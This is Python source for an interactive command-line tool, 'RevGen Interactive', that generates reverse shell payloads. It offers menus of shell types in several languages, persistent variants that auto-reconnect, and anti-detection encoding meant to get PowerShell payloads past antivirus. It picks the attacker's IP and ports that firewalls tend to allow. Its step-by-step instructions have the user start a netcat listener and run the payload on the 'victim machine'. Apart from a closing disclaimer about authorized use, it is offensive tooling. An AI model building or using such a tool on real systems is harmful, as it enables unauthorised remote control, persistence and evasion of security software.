#!/usr/bin/env python3
"""
RevGen Interactive - User-Friendly Menu Interface
Interactive CLI for generating reverse shell payloads
"""

import os
import sys
import subprocess
from typing import List, Tuple, Optional

# Add utils directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'utils'))

from utils.generator import PayloadGenerator
from utils.banner import print_banner, print_success, print_error, print_info, Colors
from utils.helpers import get_local_ip, get_public_ip, validate_ip_address, copy_to_clipboard

class InteractiveRevGen:
    """Interactive RevGen CLI interface"""
    
    def __init__(self):
        self.generator = PayloadGenerator()
        self.shells = self._get_shell_categories()
        
    def _get_shell_categories(self) -> dict:
        """Organize shells into categories"""
        all_shells = self.generator.get_available_shells()
        
        categories = {
            "Popular & Reliable": [
                "python3_persistent", "python_persistent", "bash_persistent", 
                "python3", "python", "bash"
            ],
            "Scripting Languages": [
                "perl_persistent", "ruby_persistent", "php_persistent",
                "perl", "ruby", "php", "node_persistent", "node"
            ],
            "Network Tools": [
                "nc_persistent", "nc_openbsd_persistent", "socat_persistent",
                "nc", "nc_openbsd", "socat"
            ],
            "Compiled Languages": [
                "java_persistent", "golang_persistent", 
                "java", "golang"
            ],
            "Windows": [
                "powershell_persistent", "powershell"
            ],
            "Basic Shells": [
                "sh_persistent", "sh"
            ]
        }
        
        # Only include shells that exist
        filtered_categories = {}
        for category, shell_list in categories.items():
            available_shells = [shell for shell in shell_list if shell in all_shells]
            if available_shells:
                filtered_categories[category] = available_shells
                
        return filtered_categories
    
    def print_welcome(self):
        """Print welcome banner and info"""
        print_banner("main")
        print(f"{Colors.NEON_CYAN}🧞‍♂️ Welcome to RevGen Interactive! 🧞‍♂️{Colors.RESET}")
        print(f"{Colors.YELLOW}Choose your reverse shell payload with guided assistance{Colors.RESET}")
        print("=" * 60)
        
    def show_shell_menu(self) -> str:
        """Display categorized shell menu and get user selection"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}📋 Available Reverse Shells:{Colors.RESET}")
        print("=" * 60)
        
        option_num = 1
        shell_map = {}
        
        for category, shells in self.shells.items():
            print(f"\n{Colors.BOLD}{Colors.CYAN}📁 {category}:{Colors.RESET}")
            for shell in shells:
                shell_info = self.generator.get_shell_info(shell)
                shell_name = shell_info.get('name', shell) if shell_info else shell
                description = shell_info.get('description', 'No description') if shell_info else 'No description'
                
                # Highlight persistent shells
                if 'persistent' in shell:
                    shell_display = f"{Colors.YELLOW}⭐ {shell_name}{Colors.RESET}"
                else:
                    shell_display = f"   {shell_name}"
                    
                print(f"  {Colors.WHITE}{option_num:2d}.{Colors.RESET} {shell_display}")
                print(f"      {Colors.DIM}{description[:70]}{Colors.RESET}")
                
                shell_map[option_num] = shell
                option_num += 1
        
        # Get user selection
        while True:
            try:
                print(f"\n{Colors.BOLD}Choose an option (1-{option_num-1}): {Colors.RESET}", end="")
                choice = int(input())
                if choice in shell_map:
                    selected_shell = shell_map[choice]
                    shell_info = self.generator.get_shell_info(selected_shell)
                    shell_name = shell_info.get('name', selected_shell) if shell_info else selected_shell
                    print_success(f"Selected: {shell_name}")
                    return selected_shell
                else:
                    print_error(f"Invalid choice. Please enter a number between 1 and {option_num-1}")
            except ValueError:
                print_error("Please enter a valid number")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🧞‍♂️ Goodbye!{Colors.RESET}")
                sys.exit(0)
    
    def get_network_setup(self) -> Tuple[str, int, dict]:
        """Get IP and port configuration from user"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}🌐 Network Configuration:{Colors.RESET}")
        print("=" * 40)
        
        # Get IP address
        ip = self._get_ip_address()
        
        # Get port
        port = self._get_port()
        
        return ip, port
    
    def get_encoding_options(self, shell_type: str) -> dict:
        """Get encoding/obfuscation options from user"""
        options = {"obfuscate": False, "encoding_method": "none"}
        
        # Only show encoding options for shells that benefit from it
        encoding_shells = ["powershell_persistent", "powershell", "python3_persistent", "python_persistent"]
        
        if shell_type not in encoding_shells:
            return options
        
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}🔒 Anti-Detection Options:{Colors.RESET}")
        print("=" * 45)
        
        if "powershell" in shell_type.lower():
            print(f"{Colors.YELLOW}⚠️  PowerShell payloads are often detected by antivirus{Colors.RESET}")
            print("Consider using encoding to bypass detection:")
            
            print("\nAvailable encoding methods:")
            print("  1. 🔓 None (plain text - easily detected)")
            print("  2. 🔐 Base64 Encoding (basic obfuscation)")
            print("  3. 🛡️  PowerShell Encoded Command (recommended)")
            print("  4. 🎭 Advanced Obfuscation (multiple layers)")
            
        else:
            print("Encoding options for Python payloads:")
            print("  1. 🔓 None (plain text)")
            print("  2. 🔐 Base64 Encoding")
        
        while True:
            try:
                if "powershell" in shell_type.lower():
                    print(f"\n{Colors.BOLD}Choose encoding (1-4): {Colors.RESET}", end="")
                    choice = input().strip()
                    
                    if choice == "1":
                        options["obfuscate"] = False
                        options["encoding_method"] = "none"
                        print_info("Using plain text (no encoding)")
                        break
                    elif choice == "2":
                        options["obfuscate"] = True
                        options["encoding_method"] = "base64"
                        print_info("Using Base64 encoding")
                        break
                    elif choice == "3":
                        options["obfuscate"] = True
                        options["encoding_method"] = "powershell_encoded"
                        print_info("Using PowerShell -EncodedCommand")
                        break
                    elif choice == "4":
                        options["obfuscate"] = True
                        options["encoding_method"] = "advanced"
                        print_info("Using advanced obfuscation")
                        break
                    else:
                        print_error("Invalid choice. Please enter 1-4.")
                else:
                    print(f"\n{Colors.BOLD}Choose encoding (1-2): {Colors.RESET}", end="")
                    choice = input().strip()
                    
                    if choice == "1":
                        options["obfuscate"] = False
                        options["encoding_method"] = "none"
                        print_info("Using plain text")
                        break
                    elif choice == "2":
                        options["obfuscate"] = True
                        options["encoding_method"] = "base64"
                        print_info("Using Base64 encoding")
                        break
                    else:
                        print_error("Invalid choice. Please enter 1 or 2.")
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🧞‍♂️ Goodbye!{Colors.RESET}")
                sys.exit(0)
        
        return options
    
    def _get_ip_address(self) -> str:
        """Get IP address with guided options"""
        print(f"\n{Colors.CYAN}📡 IP Address Setup:{Colors.RESET}")
        
        # Auto-detect available IPs
        local_ip = get_local_ip()
        public_ip = get_public_ip()
        
        print("Choose your connection type:")
        print(f"  1. 🏠 Local Network (same network as victim)")
        if local_ip:
            print(f"      Your local IP: {Colors.GREEN}{local_ip}{Colors.RESET}")
        
        print(f"  2. 🌍 Internet/WAN (victim on different network)")
        if public_ip:
            print(f"      Your public IP: {Colors.GREEN}{public_ip}{Colors.RESET}")
        else:
            print(f"      {Colors.YELLOW}⚠️  Could not auto-detect public IP{Colors.RESET}")
        
        print(f"  3. 🔧 Custom IP (manual entry)")
        
        while True:
            try:
                print(f"\n{Colors.BOLD}Choose option (1-3): {Colors.RESET}", end="")
                choice = input().strip()
                
                if choice == "1":
                    if local_ip:
                        print_info(f"Using local IP: {local_ip}")
                        return local_ip
                    else:
                        print_error("Could not detect local IP. Please use custom option.")
                        continue
                        
                elif choice == "2":
                    if public_ip:
                        print_info(f"Using public IP: {public_ip}")
                        print_info("⚠️  Make sure to configure port forwarding on your router!")
                        return public_ip
                    else:
                        print_error("Could not detect public IP. Please use custom option.")
                        continue
                        
                elif choice == "3":
                    while True:
                        custom_ip = input(f"{Colors.BOLD}Enter IP address: {Colors.RESET}").strip()
                        if validate_ip_address(custom_ip)[0]:
                            print_success(f"Using custom IP: {custom_ip}")
                            return custom_ip
                        else:
                            print_error("Invalid IP address format. Please try again.")
                
                else:
                    print_error("Invalid choice. Please enter 1, 2, or 3.")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🧞‍♂️ Goodbye!{Colors.RESET}")
                sys.exit(0)
    
    def _get_port(self) -> int:
        """Get port number with suggestions"""
        print(f"\n{Colors.CYAN}🔌 Port Configuration:{Colors.RESET}")
        print("Common ports:")
        print("  • 4444 (default reverse shell port)")
        print("  • 4445, 4446, 4447 (alternative reverse shell ports)")
        print("  • 443 (HTTPS - often allowed through firewalls)")
        print("  • 80 (HTTP - often allowed through firewalls)")
        print("  • 53 (DNS - often allowed through firewalls)")
        
        while True:
            try:
                port_input = input(f"\n{Colors.BOLD}Enter port (default 4444): {Colors.RESET}").strip()
                
                if not port_input:
                    port = 4444
                else:
                    port = int(port_input)
                
                if 1 <= port <= 65535:
                    print_success(f"Using port: {port}")
                    return port
                else:
                    print_error("Port must be between 1 and 65535")
                    
            except ValueError:
                print_error("Please enter a valid port number")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🧞‍♂️ Goodbye!{Colors.RESET}")
                sys.exit(0)
    
    def generate_and_display_payload(self, shell_type: str, ip: str, port: int, encoding_options: dict):
        """Generate payload and display with clear formatting"""
        try:
            # Generate the payload
            payload, shell_info = self.generator.generate_payload(ip, port, shell_type)
            
            # Apply encoding if requested
            if encoding_options["obfuscate"]:
                from utils.helpers import obfuscate_payload
                original_payload = payload
                payload = obfuscate_payload(payload, encoding_options["encoding_method"])
                print_info(f"Payload encoded using {encoding_options['encoding_method']} method")
            
            # Display results
            self._display_payload_results(shell_type, shell_info, payload, ip, port, encoding_options)
            
        except Exception as e:
            print_error(f"Failed to generate payload: {e}")
            return False
        
        return True
    
    def _display_payload_results(self, shell_type: str, shell_info: dict, payload: str, ip: str, port: int, encoding_options: dict):
        """Display payload with clear formatting and instructions"""
        shell_name = shell_info.get('name', shell_type)
        description = shell_info.get('description', 'No description')
        
        print(f"\n{'='*80}")
        print(f"{Colors.BOLD}{Colors.GREEN}✅ PAYLOAD GENERATED SUCCESSFULLY{Colors.RESET}")
        print(f"{'='*80}")
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}🎯 Shell Type:{Colors.RESET} {shell_name}")
        print(f"{Colors.BOLD}{Colors.CYAN}📝 Description:{Colors.RESET} {description}")
        print(f"{Colors.BOLD}{Colors.CYAN}🎪 Target:{Colors.RESET} {ip}:{port}")
        
        # Show encoding information
        if encoding_options["obfuscate"]:
            encoding_method = encoding_options["encoding_method"]
            if encoding_method == "powershell_encoded":
                print(f"{Colors.BOLD}{Colors.MAGENTA}🔐 Encoding:{Colors.RESET} PowerShell UTF-16 Base64")
            elif encoding_method == "advanced":
                print(f"{Colors.BOLD}{Colors.MAGENTA}🔐 Encoding:{Colors.RESET} Advanced Multi-Layer Obfuscation")
            elif encoding_method == "base64":
                print(f"{Colors.BOLD}{Colors.MAGENTA}🔐 Encoding:{Colors.RESET} Base64")
            else:
                print(f"{Colors.BOLD}{Colors.MAGENTA}🔐 Encoding:{Colors.RESET} {encoding_method}")
        else:
            print(f"{Colors.BOLD}{Colors.CYAN}🔓 Encoding:{Colors.RESET} None (Plain Text)")
        
        # Payload section with clear formatting
        print(f"\n{Colors.BOLD}{Colors.YELLOW}📋 COPY THIS PAYLOAD:{Colors.RESET}")
        print("┌" + "─" * 78 + "┐")
        print("│" + " " * 78 + "│")
        
        # Split long payloads into multiple lines for better readability
        max_width = 76
        if len(payload) > max_width:
            words = payload.split()
            lines = []
            current_line = ""
            
            for word in words:
                if len(current_line + word + " ") <= max_width:
                    current_line += word + " "
                else:
                    if current_line:
                        lines.append(current_line.rstrip())
                    current_line = word + " "
            
            if current_line:
                lines.append(current_line.rstrip())
            
            for line in lines:
                padding = " " * (78 - len(line))
                print(f"│{Colors.WHITE}{line}{Colors.RESET}{padding}│")
        else:
            padding = " " * (78 - len(payload))
            print(f"│{Colors.WHITE}{payload}{Colors.RESET}{padding}│")
        
        print("│" + " " * 78 + "│")
        print("└" + "─" * 78 + "┘")
        
        # Instructions section
        self._display_instructions(shell_type, ip, port)
        
        # Copy to clipboard option
        self._offer_clipboard_copy(payload)
    
    def _display_instructions(self, shell_type: str, ip: str, port: int):
        """Display step-by-step instructions"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}📖 STEP-BY-STEP INSTRUCTIONS:{Colors.RESET}")
        print("─" * 50)
        
        print(f"\n{Colors.BOLD}Step 1: Start Your Listener{Colors.RESET}")
        print(f"On your machine, run:")
        print(f"  {Colors.CYAN}nc -lvnp {port}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}Step 2: Execute Payload{Colors.RESET}")
        print(f"On the victim machine, execute the payload above")
        
        print(f"\n{Colors.BOLD}Step 3: Verify Connection{Colors.RESET}")
        print(f"You should see: 'Connection from {ip}:XXXXX'")
        print(f"Try basic commands: whoami, pwd, ls")
        
        # Special instructions for persistent shells
        if 'persistent' in shell_type:
            print(f"\n{Colors.BOLD}{Colors.YELLOW}🔄 Persistence Features:{Colors.RESET}")
            print(f"  • Survives terminal closure")
            print(f"  • Auto-reconnects every 10 seconds")
            print(f"  • Runs in background")
        
        # Platform-specific notes
        if 'powershell' in shell_type.lower():
            print(f"\n{Colors.BOLD}{Colors.MAGENTA}🪟 Windows Notes:{Colors.RESET}")
            print(f"  • Run as Administrator for best results")
            print(f"  • May trigger Windows Defender")
            print(f"  • Use 'Get-Help' for PowerShell commands")
        
        # Termination instructions
        print(f"\n{Colors.BOLD}{Colors.RED}🔪 To Terminate Connection:{Colors.RESET}")
        if 'persistent' in shell_type:
            if 'python' in shell_type:
                print(f"  {Colors.RED}sudo pkill -f \"python.*socket.*{ip}\"{Colors.RESET}")
            elif 'java' in shell_type:
                print(f"  {Colors.RED}sudo pkill -f \"java.*Shell\"{Colors.RESET}")
            elif 'powershell' in shell_type:
                print(f"  {Colors.RED}Get-Process | Where-Object {{$_.ProcessName -eq 'powershell'}} | Stop-Process{Colors.RESET}")
            else:
                print(f"  {Colors.RED}sudo pkill -f \"{ip}\"{Colors.RESET}")
        else:
            print(f"  Close the victim terminal or use Ctrl+C")
    
    def _offer_clipboard_copy(self, payload: str):
        """Offer to copy payload to clipboard"""
        print(f"\n{Colors.BOLD}📋 Copy to Clipboard?{Colors.RESET}")
        try:
            choice = input("Copy payload to clipboard? (y/N): ").strip().lower()
            if choice in ['y', 'yes']:
                if copy_to_clipboard(payload):
                    print_success("✅ Payload copied to clipboard!")
                else:
                    print_error("❌ Could not copy to clipboard")
        except KeyboardInterrupt:
            pass
    
    def run(self):
        """Main interactive loop"""
        try:
            # Welcome screen
            self.print_welcome()
            
            # Shell selection
            selected_shell = self.show_shell_menu()
            
            # Network configuration
            ip, port = self.get_network_setup()
            
            # Encoding options
            encoding_options = self.get_encoding_options(selected_shell)
            
            # Generate and display payload
            success = self.generate_and_display_payload(selected_shell, ip, port, encoding_options)
            
            if success:
                print(f"\n{Colors.BOLD}{Colors.GREEN}🎉 Ready to deploy! Good luck with your engagement!{Colors.RESET}")
                print(f"{Colors.DIM}Remember: Only use on authorized systems you own or have permission to test{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🧞‍♂️ Goodbye!{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            print_error(f"Unexpected error: {e}")
            sys.exit(1)

def main():
    """Entry point for interactive RevGen"""
    app = InteractiveRevGen()
    app.run()

if __name__ == "__main__":
    main()
